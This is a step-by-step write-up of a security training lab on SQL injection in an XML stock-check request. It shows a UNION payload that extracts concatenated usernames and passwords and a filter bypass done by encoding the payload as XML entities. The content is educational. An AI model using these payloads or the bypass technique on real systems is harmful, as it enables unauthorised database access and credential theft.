# Lab 10: SQL Injection with Filter Bypass via XML Encoding

## Category

SQL Injection - UNION Attack - WAF Bypass

## Objective

Exploit a SQL injection vulnerability in the stock check functionality, bypass the application's filtering mechanism using XML encoding, retrieve the credentials of the `administrator` user, then log in as that user.

---

# Solution

### 1. Identifying the Injection Point

Let's start by opening any product page and clicking **Check Stock**.

While intercepting the request, I noticed that the application sends the values of `productId` and `storeId` inside an XML request.

The request looked similar to:

```xml
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

Since `storeId` looked user-controlled, I decided to test whether the application evaluates my input.

I changed:

```xml
<storeId>1+1</storeId>
```

After sending the request, the application returned the stock information for store `2`.

This tells us that the value inside `storeId` is being evaluated rather than treated as plain text.

![The arithmetic expression is evaluated by the stock check](../assets/SQL%20Injection/Lab%2010%20-%20XML%20Filter%20Bypass/step-02-arithmetic-expression-evaluated.png)

At this point, it is worth investigating for `SQL Injection`.

![The normal stock check request and response](../assets/SQL%20Injection/Lab%2010%20-%20XML%20Filter%20Bypass/step-01-stock-request-baseline.png)

---

### 2. Testing for UNION Injection

The next thing I wanted to try was a classic `UNION` payload.

I changed the parameter to:

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

However, the request was blocked immediately.

Instead of receiving a database error, the application identified the request as a potential attack.

This strongly suggests that there is a filtering mechanism or `WAF` inspecting our input.

![The filter blocks the plain UNION payload](../assets/SQL%20Injection/Lab%2010%20-%20XML%20Filter%20Bypass/step-04-waf-blocks-union-payload.png)

---

### 3. Bypassing the Filter

Since the payload is being submitted inside XML, I suspected that XML encoding could help bypass the filter.

I selected the payload and used the Burp extension `Hackvertor`.

From the menu:

```text
Extensions > Hackvertor > Encode > hex_entities
```

or

```text
Extensions > Hackvertor > Encode > dec_entities
```

The payload was converted into XML entities.

After sending the encoded request, the application processed it normally.

The filter no longer blocked the payload.

![Encoding the payload with Hackvertor](../assets/SQL%20Injection/Lab%2010%20-%20XML%20Filter%20Bypass/step-05-encode-payload-with-hackvertor.png)

This confirms that the `WAF` is inspecting the raw request but not properly decoding XML entities before applying its filtering rules.

---

### 4. Determining the Number of Columns

Now that the filter was bypassed, I needed to determine how many columns were returned by the original query.

I started with:

```sql
1 UNION SELECT NULL
```

The request was successful.

Then I tested additional columns.

Whenever I increased the number of returned columns, the application responded with:

```text
0 units
```

which suggested that my query had failed.

From this behavior I concluded that the original query returns only:

```text
1 column
```

![The UNION column-count test response](../assets/SQL%20Injection/Lab%2010%20-%20XML%20Filter%20Bypass/step-03-union-column-count-test.png)

![Testing the encoded UNION payload with a NULL value](../assets/SQL%20Injection/Lab%2010%20-%20XML%20Filter%20Bypass/step-06-encoded-union-payload-response.png)

---

### 5. Retrieving Data from the Database

Since only one column was available, returning both `username` and `password` separately would not work.

We need to combine them into a single string.

I modified the payload to:

```sql
1 UNION SELECT username || '~' || password FROM users
```

The operator `||` concatenates strings together.

The character `~` acts as a separator between the username and password.

---

### 6. Encoding the Final Payload

Because the filter blocks obvious SQL keywords, I encoded the payload using XML entities before sending it.

The final payload conceptually looked like:

```sql
1 UNION SELECT username || '~' || password FROM users
```

but transmitted as encoded XML entities so the filter would not detect it.

After sending the request, the response returned multiple records from the `users` table.

The results looked similar to:

```text
administrator~password123
carlos~myPassword
wiener~test123
```

The exact passwords will differ for each lab instance.

---

### 7. Extracting the Administrator Credentials

From the response, I located the record belonging to `administrator`.

The format was:

```text
administrator~<password>
```

This immediately gave me:

- Username: `administrator`
- Password: `<retrieved-password>`

No additional enumeration was required.

---

### 8. Logging In

Finally, I opened **My Account** and logged in using the credentials recovered from the database.

```text
Username: administrator
Password: <retrieved-password>
```

The login was successful and the lab was solved.

![Administrator login succeeds and the lab is solved](../assets/SQL%20Injection/Lab%2010%20-%20XML%20Filter%20Bypass/step-07-administrator-login-success.png)

---

# A Bit of Theory

## Why Did `1+1` Work?

When we changed:

```xml
<storeId>1</storeId>
```

to:

```xml
<storeId>1+1</storeId>
```

the application returned the stock for store `2`.

This indicates that the value was being evaluated by the back-end query rather than treated as a literal string.

This is often an early indicator of a potential `SQL Injection` vulnerability.

---

## What is a WAF?

A `Web Application Firewall (WAF)` is a security layer that attempts to detect and block malicious payloads before they reach the application.

For example, many WAFs will flag keywords such as:

```sql
UNION
SELECT
FROM
```

and automatically block the request.

In this lab, the filter checked the raw request but failed to properly decode XML entities before applying its checks.

As a result, encoded payloads successfully bypassed the protection.

---

## Why Did XML Encoding Bypass the Filter?

Suppose the payload contains:

```sql
UNION SELECT
```

The filter recognizes these keywords and blocks the request.

However, after XML encoding, the payload no longer appears as plain text.

The filter sees encoded characters while the XML parser later decodes them back to:

```sql
UNION SELECT
```

before the SQL query executes.

This mismatch allows the payload to bypass the filter.

---

## Why Use `username || '~' || password`?

The original query only returned a single column.

Because of this, we could not use:

```sql
UNION SELECT username,password FROM users
```

Instead, we concatenate both values together:

```sql
username || '~' || password
```

which produces:

```text
administrator~password123
```

This gives us both fields inside a single column.

---

## The Complete Process

1. Identify the injectable XML parameter.
2. Verify that the input is evaluated using `1+1`.
3. Attempt a `UNION` attack.
4. Observe that the request is blocked.
5. Bypass the filter using XML entity encoding.
6. Determine the number of returned columns.
7. Extract data from the `users` table.
8. Concatenate `username` and `password`.
9. Recover the credentials for `administrator`.
10. Log in and solve the lab.

---

# What I Learned

- Identified a SQL injection vulnerability inside XML data.
- Verified that user input was evaluated by the back-end.
- Observed how a `WAF` can block obvious SQL payloads.
- Bypassed filtering using XML entity encoding.
- Used a `UNION SELECT` attack.
- Determined the number of columns returned by the query.
- Used string concatenation with `||`.
- Extracted usernames and passwords from the `users` table.
- Recovered the credentials of `administrator`.
- Practiced bypassing filtering mechanisms rather than attacking the database directly.

---

# Tools

- Burp Suite
- Proxy
- Repeater
- Hackvertor
- Browser

---

# Result

✅ Confirmed the SQL injection vulnerability.

✅ Confirmed that `storeId` was evaluated by the application.

✅ Identified and bypassed the `WAF` using XML entity encoding.

✅ Determined that the query returned a single column.

✅ Retrieved data from the `users` table using a `UNION SELECT` attack.

✅ Extracted the credentials of `administrator`.

✅ Successfully authenticated as `administrator`.

✅ Lab solved successfully.

---

# Personal Note

What I found interesting in this lab is that the SQL injection itself was not the hardest part. The real challenge was bypassing the filter. Once the `WAF` was bypassed using XML encoding, the attack became a fairly standard `UNION`-based SQL injection. This lab is a good reminder that input filtering and blacklisting are often weak defenses because a payload can frequently be rewritten or encoded in ways the filter does not expect.